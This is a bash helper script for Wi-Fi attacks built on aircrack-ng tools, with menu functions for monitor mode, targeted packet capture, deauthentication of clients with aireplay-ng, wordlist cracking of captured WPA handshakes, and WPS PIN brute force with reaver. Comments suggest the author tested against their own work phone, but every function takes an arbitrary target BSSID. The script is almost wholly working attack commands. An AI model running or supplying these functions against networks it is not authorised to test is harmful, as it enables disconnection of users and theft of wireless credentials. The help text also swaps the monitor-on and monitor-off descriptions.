#!/bin/bash 
# 25/02/21 - version 1 

# 1 - set the vaiables below accordingly 
export INTERFACE="wlan0"


function monitor-off {
airmon-ng check kill >/dev/null 2>/dev/null
airmon-ng stop wlan0mon >/dev/null 2>/dev/null
airmon-ng stop wlan0 >/dev/null 2>/dev/null
airmon-ng stop wlan1mon >/dev/null 2>/dev/null
airmon-ng stop wlan1 >/dev/null 2>/dev/null
airmon-ng stop mon0 >/dev/null 2>/dev/null
airmon-ng stop mon1 >/dev/null 2>/dev/null
airmon-ng stop $INTERFACE >/dev/null 2>/dev/null
killall NetworkManager 2>/dev/null
killall NetworkManagerDispatcher 2>/dev/null
sleep 3s
echo "$INTERFACE - Monitor Mode = OFF"
iwconfig $INTERFACE
}
function monitor-on {
# clear everything first then turn it on 
monitor-off

airmon-ng check kill
sudo ip link set $INTERFACE down
sudo iw dev $INTERFACE set type monitor
sudo ip link set $INTERFACE up

echo "$INTERFACE - Monitor Mode = ON"
iwconfig $INTERFACE
}
function managed {
monitor-off
airmon-ng check kill
ip link set $INTERFACE down
iw dev $INTERFACE set type managed
ip link set $INTERFACE up
echo "$INTERFACE - Managed Mode"
iwconfig $INTERFACE
}
function connect-wpa {
# connect to the actual wireless 

echo -n "Please enter the ESSID: "
read ESSID
echo ""
echo -n "Please enter the KEY: "
read KEY
echo ""
echo ""

# clear everything first
monitor-off


ifconfig $INTERFACE down
sleep 2
ifconfig $INTERFACE up
sleep 3

rm "$ESSID".conf 2> /dev/null
wpa_passphrase "$ESSID" >> "$ESSID".conf "$KEY"
wpa_supplicant -D wext -B -i $INTERFACE -c "$ESSID".conf
echo ""
iw $INTERFACE link
echo ""
dhclient $INTERFACE -v

ifconfig $INTERFACE

ping -c3 google.co.uk

echo "Should be connected to - " $ESSID


}
function dump-ap {
# will focus on a AP and dump the contents

echo -n "BSSID: " 
read BSSID
echo -n "CHANNEL: " 
read CHANNEL

monitor-on
	

airodump-ng --bssid $BSSID -c $CHANNEL $INTERFACE -w ap_"$ESSID"_"$CHANNEL"

}
function dump-air {
# will dump anything in the area
monitor-on
airodump-ng $INTERFACE -w dump-air
}
function deauth {
# make sure sniff-handshake is running first in another tab
# connect work iphone Network to boot off and get handshake

# 50:A6:7F:55:86:93 = My Work iPhone

if [ -z "$(iwconfig $INTERFACE| grep "Mode:" | grep -o "Monitor")" ]
then
    echo "$INTERFACE - Not in Monitor Mode"
else
    echo -n "BSSID: " 
	read BSSID
	echo -n "CLIENT MAC: " 
	read CMAC
	echo "" 
	
	read -p "Airodump running? - Press ENTER to Continue"
	
	aireplay-ng -0 2 -a $BSSID -c $CMAC $INTERFACE | tee deatuh_"$BSSID"-"$CMAC".log
fi
}
function cap-crack {
echo -n "Please enter path to the .CAP file (use realpath): " 
read CAP
echo -n "Please enter the BSSID: " 
read BSSID
echo -n "WORDLIST path:" 
read WORDLIST
echo ""
aircrack-ng -w $WORDLIST -b $BSSID "$(realpath $CAP)" -l cracked_$BSSID.txt | tee cracked_$BSSID.log
}
function run-wash {

# enable monitor mode
monitor-on

# run wash
wash -i $INTERFACE | tee wash_$INTERFACE.txt 2>/dev/null
}
function sniff-handshake {
echo -n "Please enter the BSSID: " 
read BSSID
echo ""
echo -n "Please enter the CHANNEL: " 
read CHANNEL

# enable monitor mode
monitor-on

airodump-ng --bssid $BSSID -c $CHANNEL $INTERFACE --band abgn -w handshake_"$BSSID"_"$CHANNEL" 
}
function sniff-air {
# enable monitor mode
monitor-on
airodump-ng $INTERFACE -w sniff-air-$INTERFACE
}
function site-survey {
# DISABLE monitor mode
monitor-off
iw $INTERFACE scan | tee sitesurvey.txt

# sniff air for a while 
sniff-air
}
function wps-crack {
echo -n "Please enter the BSSID of the target: " 
read BSSID
echo ""
echo -n "Please enter the CHANNEL: " 
read CHANNEL
echo ""
echo -n "How many seconds between tries?: " 
read TIME
echo ""

# enable monitor mode
monitor-on

# run reaver
reaver -i $INTERFACE -c $CHANNEL -b $BSSID -K 1 -d $TIME -S -N -vv | tee reaver_$BSSID-$CHANNEL.log 2>/dev/null
}

### MAIN ####
if [ -z "$1" ]; then
	echo "[*] Usage: $0 <FUNCTION>"
	echo "-------------------
make sure you set the INTERFACE within the script

INTERFACE = $INTERFACE

FUNCTIONS:
	monitor-off		enables monitor mode on $INTERFACE
	monitor-on		disabled monitor mode on $INTERFACE 
	managed			puts $INTERFACE into managed mode
	connect-wpa		wizard - connect to WPA Wireless 
	dump-ap			use aircrack to dump a targetted AP
	dump-air		use aircrack to dump whats around 
	deauth			run a deauth attack. connect phone to AP then kick it off. make sure you get correct channel and BSSID
	cap-crack		crack a captured handshake - make sure WORDLIST variable is set	
	run-wash		run wash ibn the area
	sniff-handshake		wizard - target an AP to sniff for a handshake
	sniff-air		generally sniff whats about
	site-survey		do a site survey of what is about
	wps-crack 		crack wps
	"
	exit 0
fi

if [ ! -z "$1" ]; then
$1
fi 
